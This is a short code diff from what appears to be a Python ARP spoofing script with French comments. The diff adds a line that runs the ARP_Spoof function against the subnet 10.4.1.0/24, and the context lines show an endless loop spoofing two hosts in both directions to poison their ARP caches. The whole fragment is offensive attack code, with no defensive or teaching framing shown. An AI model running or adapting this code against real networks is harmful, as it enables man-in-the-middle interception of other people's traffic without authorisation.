@@ -33,3 +33,4 @@ def ARP_Spoof(Network = str):
     while True: # Redistribution des requêtes ARP 
             spoof(IP[1], IP[2])
             spoof(IP[2], IP[1])
+print(ARP_Spoof("10.4.1.0/24"))
